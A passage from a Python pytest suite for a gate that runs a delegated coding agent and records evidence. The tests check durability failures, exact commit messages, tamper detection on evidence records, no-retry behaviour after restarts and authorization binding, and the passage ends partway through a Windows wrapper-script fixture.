    assert outcome.status is NativeCanaryStatus.DURABILITY_UNCERTAIN and h.runner.invocations==[]


def test_behavioral_record_directory_durability_uncertainty_is_visible_and_never_captures(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    calls={"publish":0,"capture":0}
    class BehavioralPublicationUncertain(PlatformDurabilityAdapter):
        def publish(self, final_path, data, *, mode, replacement_authority=None):
            result=super().publish(final_path,data,mode=mode,replacement_authority=replacement_authority)
            calls["publish"]+=1
            if Path(final_path).name.endswith(".native-behavioral.json"):
                raise PublicationVisibleButMetadataUncertain(
                    "injected behavioral metadata durability uncertainty",
                    path=Path(final_path),
                    file_content_durable=True,
                    publication_visible=True,
                    metadata_status=PublicationMetadataDurability.PUBLICATION_METADATA_UNCERTAIN,
                )
            return result
    h=_harness(tmp_path,durability_adapter=BehavioralPublicationUncertain())
    def capture(**kwargs: object) -> object:
        calls["capture"]+=1
        raise AssertionError("checkpoint must not be reached after behavioral durability uncertainty")
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",capture)
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.DURABILITY_UNCERTAIN and second.status is NativeCanaryStatus.DURABILITY_UNCERTAIN
    assert h.store.has_behavioral_evidence(h.session_id,"native-canary-gate",0) and calls["capture"]==0


@pytest.mark.parametrize("runner,expected",[(FakeNativeProcessRunner(mutation=None,timed_out=True,returncode=None),NativeCanaryStatus.TIMED_OUT),(FakeNativeProcessRunner(mutation=None,returncode=7),NativeCanaryStatus.PROCESS_FAILED),(FakeNativeProcessRunner(mutation=None,cleanup_confirmed=False),NativeCanaryStatus.CLEANUP_UNCERTAIN)])
def test_process_failure_boundaries_create_terminal_without_checkpoint(tmp_path: Path,runner: FakeNativeProcessRunner,expected: NativeCanaryStatus):
    h=_harness(tmp_path,runner=runner); outcome=h.coordinator.run(session_id=h.session_id); assert outcome.status is expected or outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED
    assert h.session_store.load(h.session_id).phase is Phase.GATE_EXECUTING


def test_zero_exit_without_commit_never_captures_checkpoint(tmp_path: Path):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=None)); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED; assert h.session_store.load(h.session_id).checkpoint_history==()
    assert h.store.has_process_observation(h.session_id,CANARY_GATE_ID,0) and not h.store.has_result(h.session_id,CANARY_GATE_ID,0)
    assert outcome.provider_invocations==1 and outcome.accepted_native_results_published==0


def test_wrong_message_extra_commit_dirty_tree_remote_and_missing_path_all_block_before_checkpoint(tmp_path: Path):
    cases=[]
    def wrong(work: Path) -> None: _materialize_success(work); (work/"README.md").write_text("wrong message\n",encoding="utf-8"); _commit(work,"wrong")
    def extra(work: Path) -> None: _materialize_success(work); (work/"extra.txt").write_text("x",encoding="utf-8"); _commit(work,"extra")
    def dirty(work: Path) -> None: _materialize_success(work); (work/"dirty.txt").write_text("x",encoding="utf-8")
    def remote(work: Path) -> None: _materialize_success(work); _command(["git","remote","add","origin","https://invalid.example/repo.git"],cwd=work)
    def missing(work: Path) -> None: _materialize_success(work); _command(["git","reset","--soft","HEAD~1"],cwd=work); _command(["git","checkout","HEAD","--","README.md"],cwd=work); _commit(work,REQUIRED_COMMIT_MESSAGE)
    for mutation in (wrong,extra,dirty,remote,missing):
        case_root=tmp_path/str(len(cases)); case_root.mkdir()
        h=_harness(case_root,runner=FakeNativeProcessRunner(mutation=mutation)); cases.append(h.coordinator.run(session_id=h.session_id)); assert h.session_store.load(h.session_id).checkpoint_history==()
    assert all(item.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED for item in cases)


def test_exact_complete_commit_message_is_accepted(tmp_path: Path):
    h=_harness(tmp_path); outcome=h.coordinator.run(session_id=h.session_id)
    eligibility=h.store.load_execution_eligibility(h.session_id,CANARY_GATE_ID,0)
    assert outcome.canary_success and eligibility.commit_message_compliant and eligibility.eligible
    assert h.store.load_result(h.session_id,CANARY_GATE_ID,0).final_commit_message==REQUIRED_COMMIT_MESSAGE


@pytest.mark.parametrize("extra",[
    "Co-authored-by: Cursor <cursoragent@cursor.com>",
    "body text is forbidden",
    "Signed-off-by: Cursor <cursoragent@cursor.com>",
])
def test_complete_commit_message_rejects_trailer_body_and_signoff_before_behavioral(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, extra: str):
    def mutation(repository: Path) -> None:
        _materialize_success(repository); _amend_message(repository,REQUIRED_COMMIT_MESSAGE,extra)
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=mutation)); calls={"behavioral":0}
    monkeypatch.setattr("admissible.delegated_gate.native_canary.run_behavioral_verifier",lambda **_: calls.__setitem__("behavioral",calls["behavioral"]+1))
    outcome=h.coordinator.run(session_id=h.session_id)
    eligibility=h.store.load_execution_eligibility(h.session_id,CANARY_GATE_ID,0)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED
    assert not eligibility.commit_message_compliant and "complete_commit_message_mismatch" in eligibility.ineligibility_reasons
    assert calls["behavioral"]==0 and outcome.provider_invocations==1 and outcome.accepted_native_results_published==0


def test_mutable_tests_cannot_self_certify_and_behavioral_evidence_is_fingerprinted(tmp_path: Path):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=_mutate_without_feature)); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED; request=h.store.load_request(h.session_id,"native-canary-gate",0); evidence=load_behavioral_verifier(request=request,execution_store=h.store); assert evidence.exit_code != 0
    assert EXPECTED_MATERIAL_PATHS.issubset(set(h.store.load_result(h.session_id,"native-canary-gate",0).changed_material_files))


def test_genuine_implementation_passes_behavioral_verifier_and_reconstructs_disk_evidence(tmp_path: Path):
    h=_harness(tmp_path); first=h.coordinator.run(session_id=h.session_id); assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
    second=h.coordinator.run(session_id=h.session_id); assert second.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and second.provider_invocations==1 and len(h.runner.invocations)==1
    request=h.store.load_request(h.session_id,"native-canary-gate",0); assert run_behavioral_verifier(request=request,execution_store=h.store).exit_code==0


def test_capture_failure_is_terminal_and_repeated_call_never_retries(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",lambda **_: (_ for _ in ()).throw(RuntimeError("capture boom")))
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and second.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and len(h.runner.invocations)==1
    assert first.provider_invocations==second.provider_invocations==1 and first.accepted_native_results_published==1


def _materialize_success_with_failing_checkpoint_command(repository: Path) -> None:
    _materialize_success(repository)
    package=json.loads((repository/"package.json").read_text(encoding="utf-8"))
    package["scripts"]["test"]="node --input-type=module -e \"process.exit(7)\""
    (repository/"package.json").write_text(json.dumps(package),encoding="utf-8",newline="\n")
    env=dict(os.environ); env.update({"GIT_AUTHOR_NAME":"Deterministic Fake Executor","GIT_AUTHOR_EMAIL":"fake@invalid.example","GIT_COMMITTER_NAME":"Deterministic Fake Executor","GIT_COMMITTER_EMAIL":"fake@invalid.example","GIT_AUTHOR_DATE":"2026-01-02T00:00:00Z","GIT_COMMITTER_DATE":"2026-01-02T00:00:00Z"})
    _command(["git","add","package.json"],cwd=repository); _command(["git","commit","--quiet","--amend","--no-edit"],cwd=repository,env=env)


def test_failed_checkpoint_command_is_terminal_and_never_persists_success(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=_materialize_success_with_failing_checkpoint_command)); count={"value":0}
    from admissible.delegated_gate.checkpoint import capture_checkpoint as production_capture_checkpoint
    def counted_capture(**kwargs: object) -> object:
        count["value"]+=1
        return production_capture_checkpoint(**kwargs)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",counted_capture)
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    state=h.session_store.load(h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and second.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED
    assert state.phase is Phase.GATE_EXECUTING and state.checkpoint_history==() and count["value"]==1


def test_started_capture_record_is_ambiguous_and_never_replayed(tmp_path: Path):
    h=_harness(tmp_path); state=h.session_store.load(h.session_id); started=__import__("admissible.delegated_gate.reducer",fromlist=["reduce"]).reduce(state,__import__("admissible.delegated_gate.events",fromlist=["GateExecutionStarted"]).GateExecutionStarted(state.current_gate.gate_id)); h.session_store.replace(started,expected_revision=state.revision)
    request,prompt=_request(h); h.store.create_request(request); issued=h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store); result=h.store.write_result(issued); behavioral=run_behavioral_verifier(request=request,execution_store=h.store)
    h.store.create_capture_attempt(request=request,result=result,gate_plan_fingerprint=state.gate_plan.plan_fingerprint,checkpoint_contract_fingerprint=state.current_gate.contract_fingerprint,behavioral_evidence_fingerprint=behavioral.evidence_fingerprint,required_command_ids=tuple(command.command_id for command in state.current_gate.checkpoint_verification_commands),state_revision=state.revision)
    outcome=h.coordinator.run(session_id=h.session_id); assert outcome.status is NativeCanaryStatus.CAPTURE_ATTEMPT_AMBIGUOUS and len(h.runner.invocations)==1


def test_restart_with_visible_request_and_no_result_is_inert_no_retry(tmp_path: Path):
    h=_harness(tmp_path); state=h.session_store.load(h.session_id)
    started=__import__("admissible.delegated_gate.reducer",fromlist=["reduce"]).reduce(
        state,
        __import__("admissible.delegated_gate.events",fromlist=["GateExecutionStarted"]).GateExecutionStarted(state.current_gate.gate_id),
    )
    h.session_store.replace(started,expected_revision=state.revision)
    request,_=_request(h); h.store.create_request(request)
    restarted_store=AtomicNativeExecutionStore(h.store.directory)
    restarted_sessions=AtomicDelegatedSessionStore(h.session_store.directory)
    restarted=NativeCanaryCoordinator(
        session_store=restarted_sessions,execution_store=restarted_store,executor=h.executor,
        backend_attestation=h.attestation,source_repository=h.source,work_workspace=h.work,
        canary_parent=h.root,evidence_directory=h.evidence,timeout_seconds=30,
        stdout_byte_limit=4096,stderr_byte_limit=2048,
    )
    outcome=restarted.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.EXECUTION_RESULT_MISSING_NO_RETRY
    assert restarted_sessions.load(h.session_id).phase is Phase.GATE_EXECUTING
    assert not restarted_store.has_result(h.session_id,"native-canary-gate",0)
    assert not restarted_store.has_capture_attempt(h.session_id,"native-canary-gate",0)
    assert h.runner.invocations==[]
    assert not tuple(restarted_store.directory.glob("*.attempt-1.*"))


def test_attempt_lifecycle_order_and_truthful_actual_counts(tmp_path: Path):
    h=_harness(tmp_path)
    class OrderingRunner(FakeNativeProcessRunner):
        def run(self, invocation: NativeProcessInvocation) -> NativeProcessOutcome:
            assert h.store.has_attempt_reserved(h.session_id,CANARY_GATE_ID,0)
            assert not h.store.has_process_started(h.session_id,CANARY_GATE_ID,0)
            return super().run(invocation)
    ordered=OrderingRunner(); h.runner=ordered; h.executor.process_runner=ordered
    outcome=h.coordinator.run(session_id=h.session_id)
    reserved=h.store.load_attempt_reserved(h.session_id,CANARY_GATE_ID,0)
    started=h.store.load_process_started(h.session_id,CANARY_GATE_ID,0)
    observation=h.store.load_process_observation(h.session_id,CANARY_GATE_ID,0)
    eligibility=h.store.load_execution_eligibility(h.session_id,CANARY_GATE_ID,0)
    assert reserved.reserved_at < started.process_started_at < observation.process["ended_at"] < eligibility.evaluated_at
    assert (outcome.native_attempts_reserved,outcome.native_processes_started,outcome.native_processes_completed,outcome.process_observations_published,outcome.accepted_native_results_published,outcome.provider_invocations)==(1,1,1,1,1,1)
    assert observation.process_completion_observed and eligibility.eligible
    result=h.store.load_result(h.session_id,CANARY_GATE_ID,0); request=h.store.load_request(h.session_id,CANARY_GATE_ID,0)
    assert result.argv==(request.executable,*request.launcher_prefix)
    assert all("Immutable mission:" not in item for item in result.argv)
    lifecycle_bytes=b"".join(h.store._path(kind,h.session_id,CANARY_GATE_ID,0).read_bytes() for kind in ("attempt-reserved","process-started","process-observation","execution-eligibility"))
    assert b"Immutable mission:" not in lifecycle_bytes and b"OWNER_AUTHORIZATION" not in lifecycle_bytes and b"authorization_digest" not in lifecycle_bytes and b"environment" not in lifecycle_bytes
    with pytest.raises(NativeResultAlreadyExists): h.store.create_attempt_reserved(request=h.store.load_request(h.session_id,CANARY_GATE_ID,0),argv_fingerprint=reserved.argv_fingerprint,reserved_at=reserved.reserved_at,authorized_model=reserved.authorized_model)
    with pytest.raises(NativeResultAlreadyExists): h.store.create_process_started(binding=h.store.load_request_structural(h.session_id,CANARY_GATE_ID,0),reservation=reserved,proof=_NativeProcessCreationProof._after_successful_spawn(4242),started_at=started.process_started_at)
    with pytest.raises(NativeResultAlreadyExists): h.store.create_process_observation(observation)
    with pytest.raises(NativeResultAlreadyExists): h.store.create_execution_eligibility(eligibility)


def test_spawn_failure_reserves_without_claiming_start_or_provider_consumption(tmp_path: Path):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(spawn_error=True))
    outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PROCESS_SPAWN_FAILED
    assert (outcome.native_attempts_reserved,outcome.native_processes_started,outcome.native_processes_completed,outcome.process_observations_published,outcome.accepted_native_results_published,outcome.provider_invocations)==(1,0,0,0,0,0)
    assert h.store.has_terminal(h.session_id,CANARY_GATE_ID,0)
    terminal=h.store.load_terminal(h.session_id,CANARY_GATE_ID,0)
    assert terminal.attempt_reserved_fingerprint and terminal.process_started_fingerprint is None and terminal.process_observation_fingerprint is None
    assert not h.store.has_process_started(h.session_id,CANARY_GATE_ID,0)


def test_process_started_record_rejects_non_runner_creation_proof(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    argv=request.backend_attestation.argv(prompt=prompt)
    reserved=h.store.create_attempt_reserved(request=request,argv_fingerprint=hashlib.sha256(__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(list(argv))).hexdigest(),reserved_at=Clock()(),authorized_model=h.attestation.selected_model)
    with pytest.raises(NativeEvidenceInvalid,match="runner authority"):
        h.store.create_process_started(binding=h.store.load_request_structural(h.session_id,CANARY_GATE_ID,0),reservation=reserved,proof=_NativeProcessCreationProof(4242,object()),started_at="2026-07-16T10:00:01.000000Z")
    assert not h.store.has_process_started(h.session_id,CANARY_GATE_ID,0)


@pytest.mark.parametrize(("runner","expected"),[
    (FakeNativeProcessRunner(mutation=None,timed_out=True,returncode=None),NativeCanaryStatus.TIMED_OUT),
    (FakeNativeProcessRunner(mutation=None,cleanup_confirmed=False),NativeCanaryStatus.CLEANUP_UNCERTAIN),
])
def test_started_timeout_and_cleanup_failure_report_provider_actual_one(tmp_path: Path, runner: FakeNativeProcessRunner, expected: NativeCanaryStatus):
    h=_harness(tmp_path,runner=runner); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is expected
    assert (outcome.native_attempts_reserved,outcome.native_processes_started,outcome.native_processes_completed,outcome.process_observations_published,outcome.accepted_native_results_published,outcome.provider_invocations)==(1,1,1,1,0,1)


def test_process_observation_publication_failure_is_terminal_and_never_reruns(tmp_path: Path):
    class RejectObservation(PlatformDurabilityAdapter):
        def publish(self,final_path,data,*,mode,replacement_authority=None):
            if Path(final_path).name.endswith(".native-process-observation.json"):
                raise DurabilityAdapterError("injected observation failure",path=Path(final_path))
            return super().publish(final_path,data,mode=mode,replacement_authority=replacement_authority)
    h=_harness(tmp_path,durability_adapter=RejectObservation())
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.PROCESS_OBSERVATION_PUBLICATION_FAILED
    assert second.status is NativeCanaryStatus.PROCESS_OBSERVATION_PUBLICATION_FAILED
    assert (first.native_attempts_reserved,first.native_processes_started,first.native_processes_completed,first.process_observations_published,first.provider_invocations)==(1,1,0,0,1)
    terminal=h.store.load_terminal(h.session_id,CANARY_GATE_ID,0)
    assert terminal.attempt_reserved_fingerprint and terminal.process_started_fingerprint and terminal.process_observation_fingerprint is None
    assert len(h.runner.invocations)==1 and not h.store.has_result(h.session_id,CANARY_GATE_ID,0)


def test_accepted_result_publication_is_distinct_from_started_invocation(tmp_path: Path):
    class RejectAcceptedResult(PlatformDurabilityAdapter):
        def publish(self,final_path,data,*,mode,replacement_authority=None):
            if Path(final_path).name.endswith(".native-result.json"):
                raise DurabilityAdapterError("injected accepted-result failure",path=Path(final_path))
            return super().publish(final_path,data,mode=mode,replacement_authority=replacement_authority)
    h=_harness(tmp_path,durability_adapter=RejectAcceptedResult())
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED and second.status is first.status
    assert (first.native_attempts_reserved,first.native_processes_started,first.native_processes_completed,first.process_observations_published,first.accepted_native_results_published,first.provider_invocations)==(1,1,1,1,0,1)
    assert h.store.load_execution_eligibility(h.session_id,CANARY_GATE_ID,0).eligible
    assert len(h.runner.invocations)==1 and not h.store.has_result(h.session_id,CANARY_GATE_ID,0)


def _put_gate_executing(h: Harness) -> None:
    state=h.session_store.load(h.session_id)
    started=__import__("admissible.delegated_gate.reducer",fromlist=["reduce"]).reduce(state,__import__("admissible.delegated_gate.events",fromlist=["GateExecutionStarted"]).GateExecutionStarted(state.current_gate.gate_id))
    h.session_store.replace(started,expected_revision=state.revision)


def test_restart_reserved_only_never_creates_a_second_process(tmp_path: Path):
    h=_harness(tmp_path); _put_gate_executing(h); request,prompt=_request(h); h.store.create_request(request)
    argv=request.backend_attestation.argv(prompt=prompt)
    h.store.create_attempt_reserved(request=request,argv_fingerprint=hashlib.sha256(__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(list(argv))).hexdigest(),reserved_at=Clock()(),authorized_model=h.attestation.selected_model)
    outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.ATTEMPT_RESERVED_LAUNCH_OUTCOME_UNKNOWN
    assert outcome.native_attempts_reserved==1 and outcome.native_processes_started==0 and h.runner.invocations==[]
    assert not tuple(h.store.directory.glob("*.attempt-1.*"))


def test_restart_process_started_without_observation_never_reruns(tmp_path: Path):
    h=_harness(tmp_path); _put_gate_executing(h); request,prompt=_request(h); h.store.create_request(request)
    argv=request.backend_attestation.argv(prompt=prompt); clock=Clock()
    reserved=h.store.create_attempt_reserved(request=request,argv_fingerprint=hashlib.sha256(__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(list(argv))).hexdigest(),reserved_at=clock(),authorized_model=h.attestation.selected_model)
    h.store.create_process_started(binding=h.store.load_request_structural(h.session_id,CANARY_GATE_ID,0),reservation=reserved,proof=_NativeProcessCreationProof._after_successful_spawn(4242),started_at=clock())
    outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PROCESS_OBSERVATION_MISSING
    assert outcome.provider_invocations==1 and h.runner.invocations==[]
    assert not tuple(h.store.directory.glob("*.attempt-1.*"))


def test_restart_observation_without_eligibility_never_recomputes_or_reruns(tmp_path: Path):
    class RejectEligibility(PlatformDurabilityAdapter):
        def publish(self,final_path,data,*,mode,replacement_authority=None):
            if Path(final_path).name.endswith(".native-execution-eligibility.json"):
                raise DurabilityAdapterError("injected eligibility failure",path=Path(final_path))
            return super().publish(final_path,data,mode=mode,replacement_authority=replacement_authority)
    h=_harness(tmp_path,durability_adapter=RejectEligibility()); _put_gate_executing(h); request,prompt=_request(h); h.store.create_request(request)
    with pytest.raises(NativeExecutionStoreError):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    assert h.store.has_process_observation(h.session_id,CANARY_GATE_ID,0) and not h.store.has_execution_eligibility(h.session_id,CANARY_GATE_ID,0)
    h.executor._local_attestor=lambda _: (_ for _ in ()).throw(AssertionError("restart must not re-attest"))
    before=len(h.runner.invocations); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.EXECUTION_ELIGIBILITY_MISSING and len(h.runner.invocations)==before==1
    assert not tuple(h.store.directory.glob("*.attempt-1.*"))


def test_canary_002_synthetic_copy_parses_as_legacy_terminal_without_invented_lifecycle(tmp_path: Path):
    source=Path(__file__).resolve().parents[2]/"native-cursor-canary-002"
    if not source.is_dir(): pytest.skip("immutable canary-002 forensic run is unavailable")
    synthetic=tmp_path/"synthetic-canary-002"; shutil.copytree(source,synthetic)
    store=AtomicNativeExecutionStore(synthetic/"evidence"/"native-execution")
    binding=store.load_request_structural("native-cursor-canary-002",CANARY_GATE_ID,0)
    terminal=store.load_terminal("native-cursor-canary-002",CANARY_GATE_ID,0)
    counts=store.lifecycle_counts("native-cursor-canary-002",CANARY_GATE_ID,0)
    assert binding.request_fingerprint==terminal.request_fingerprint
    assert terminal.schema_version=="admissible_native_canary_terminal_v1"
    assert terminal.attempt_reserved_fingerprint is None and terminal.process_started_fingerprint is None and terminal.process_observation_fingerprint is None and terminal.execution_eligibility_fingerprint is None
    assert counts==type(counts)() and not tuple(store.directory.glob("*.attempt-1.*"))


def test_canary_003_synthetic_copy_remains_terminal_with_its_original_blocking_eligibility(tmp_path: Path):
    source = Path(__file__).resolve().parents[2] / "native-cursor-canary-003"
    if not source.is_dir(): pytest.skip("immutable canary-003 forensic run is unavailable")
    synthetic = tmp_path / "synthetic-canary-003"; shutil.copytree(source, synthetic)
    store = AtomicNativeExecutionStore(synthetic / "evidence" / "native-execution")
    eligibility_path = store._path("execution-eligibility", "native-cursor-canary-003", CANARY_GATE_ID, 0)
    raw = json.loads(eligibility_path.read_text(encoding="utf-8"))
    eligibility = store.load_execution_eligibility("native-cursor-canary-003", CANARY_GATE_ID, 0)
    terminal = store.load_terminal("native-cursor-canary-003", CANARY_GATE_ID, 0)
    counts = store.lifecycle_counts("native-cursor-canary-003", CANARY_GATE_ID, 0)
    assert set(raw) == set(NativeExecutionEligibility.__dataclass_fields__)
    assert eligibility.schema_version == "admissible_native_execution_eligibility_v1"
    assert not eligibility.eligible and "post_run_backend_drift" in eligibility.ineligibility_reasons
    assert eligibility.selected_version_validation == "METADATA_ONLY_DRIFT"
    assert "selected_version:METADATA_ONLY_DRIFT" in eligibility.backend_drift_diagnostics
    assert "selected_version:METADATA_ONLY_DRIFT:FUTURE_ATTESTATION_REFRESH_REQUIRED" not in eligibility.backend_drift_diagnostics
    assert terminal.status is NativeCaptureTerminalStatus.PRECAPTURE_FAILED
    assert counts.provider_invocations_started == 1
    assert not store.has_result("native-cursor-canary-003", CANARY_GATE_ID, 0)
    assert not store.has_behavioral_evidence("native-cursor-canary-003", CANARY_GATE_ID, 0)
    assert not store.has_capture_attempt("native-cursor-canary-003", CANARY_GATE_ID, 0)
    assert not tuple(store.directory.glob("*.attempt-1.*"))


def test_checkpoint_artifact_tamper_blocks_final_reconstruction(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success; state=h.session_store.load(h.session_id); ref=state.checkpoint_history[-1].artifact_references[0]; path=h.evidence/"checkpoint-artifacts"/ref.relative_path; path.write_bytes(path.read_bytes()+b"tamper")
    with pytest.raises(NativeEvidenceInvalid,match="checkpoint artifact hash"):
        h.coordinator.run(session_id=h.session_id)


@pytest.mark.parametrize(("field", "value"), [
    ("checkpoint_contract_fingerprint", "0" * 64),
    ("gate_id", "substituted-gate"),
    ("request_fingerprint", "1" * 64),
    ("result_fingerprint", "2" * 64),
    ("behavioral_evidence_fingerprint", "3" * 64),
    ("capture_attempt_id", "capture:other-session:other-gate:0"),
    ("expected_terminal_status", "CAPTURE_FAILED"),
])
def test_reconstruction_binds_every_capture_attempt_authority_field(tmp_path: Path, field: str, value: str):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    path=h.store._path("capture-attempt",h.session_id,"native-canary-gate",0); original=path.read_bytes(); raw=json.loads(original)
    raw[field]=value; raw["attempt_fingerprint"]=fingerprint({key:item for key,item in raw.items() if key!="attempt_fingerprint"}); path.write_bytes(__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(raw)+b"\n")
    with pytest.raises(NativeEvidenceInvalid): h.coordinator.run(session_id=h.session_id)


def test_duplicate_capture_attempt_record_blocks_final_reconstruction(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    original=h.store._path("capture-attempt",h.session_id,"native-canary-gate",0)
    duplicate=h.store.directory/f"{h.session_id}.native-canary-gate.attempt-99.native-capture-attempt.json"; duplicate.write_bytes(original.read_bytes())
    with pytest.raises(NativeEvidenceInvalid,match="alternate or duplicate"):
        h.coordinator.run(session_id=h.session_id)


def test_authorization_payload_binds_backend_head_model_timeout_and_run_id(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path); payload=build_authorization_payload(source_repository=h.source,source_head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip(),run_id="run-one",session_id=h.session_id,attestation=h.attestation,run_root=tmp_path/"future-run",timeout_seconds=30)
    phrase="owner phrase"; digest=hashlib.sha256(phrase.encode()+b"\0"+__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(payload.to_dict())).hexdigest(); monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256",digest)
    from admissible.delegated_gate.native_canary import _authorized
    assert _authorized(phrase,payload,active_source_repository=h.source) and not _authorized("wrong",payload,active_source_repository=h.source)
    changed=payload.to_dict(); changed["run_id"]="run-two"; changed["payload_fingerprint"]=fingerprint({key:value for key,value in changed.items() if key!="payload_fingerprint"})
    from admissible.delegated_gate.native_canary import NativeCanaryAuthorizationPayload
    assert not _authorized(phrase,NativeCanaryAuthorizationPayload.from_dict(changed),active_source_repository=h.source)
    for field,value in (("source_head","f"*40),("backend_attestation_fingerprint","0"*64),("selected_model","other-model"),("timeout_seconds",31)):
        changed=payload.to_dict(); changed[field]=value; changed["payload_fingerprint"]=fingerprint({key:value for key,value in changed.items() if key!="payload_fingerprint"})
        altered=NativeCanaryAuthorizationPayload.from_dict(changed)
        assert not _authorized(phrase,altered,active_source_repository=h.source)


def test_preflight_only_is_effect_free_and_existing_run_id_is_rejected(tmp_path: Path,monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    h=_harness(tmp_path); head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip(); preflight_root=tmp_path/"preflight-run"
    common=["--source-repository",str(h.source),"--required-source-head",head,"--run-root",str(preflight_root),"--run-id","preflight-run","--session-id",h.session_id,"--executable",h.config.executable,"--executable-prefix-arg",h.config.launcher_prefix[0],"--timeout-seconds","30"]
    # An injected test attestation is not production provenance.  The real CLI
    # therefore blocks before creating a run root or invoking any provider.
    assert main([*common,"--preflight-only"])==2 and not preflight_root.exists() and h.runner.invocations==[]
    captured=json.loads(capsys.readouterr().out)
    assert captured["status"]==NativePreflightStatus.PREFLIGHT_BLOCKED.value


# --- Act 2A.2: LOCAL_WRAPPER_CHAIN attestation ------------------------------

from admissible.delegated_gate.native_canary import NativeCanaryAuthorizationPayload
from admissible.delegated_gate.native_executor import (
    ATTESTATION_CLASS_PACKAGE_BIN,
    ATTESTATION_CLASS_WRAPPER_CHAIN,
    WRAPPER_CHAIN_CLAIMS,
    WRAPPER_CHAIN_NON_CLAIMS,
    WRAPPER_CHAIN_READY_REASON,
    WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION,
    WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION_LEGACY_V1,
    PowerShellCommandObservation,
    WhereCommandObservation,
    WindowsWhereDiagnosticStatus,
    WrapperChainBackendAttestation,
    attestation_from_dict,
    preflight_native_cursor as _preflight,
    _attest_local_backend,
    _attest_wrapper_chain_cursor,
    _attest_wrapper_chain_cursor_observed,
    _deterministic_windows_resolve,
    _parse_cmd_wrapper,
    _parse_powershell_wrapper,
    _POWERSHELL_WRAPPER_TEMPLATE_LINES,
    _safe_directory,
    _same_file_authority,
    _same_directory_identity,
    _same_mutable_directory_entry,
)

_OBSERVED_CMD_WRAPPER = (
    '@echo off\r\n'
    'setlocal enabledelayedexpansion\r\n'
    'set "CURSOR_INVOKED_AS=%~nx0"\r\n'
    '\r\n'
    'REM Get the directory of this script\r\n'
    'set "SCRIPT_DIR=%~dp0"\r\n'
    'REM Remove trailing backslash\r\n'
    'if "%SCRIPT_DIR:~-1%"=="\\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"\r\n'
    '\r\n'
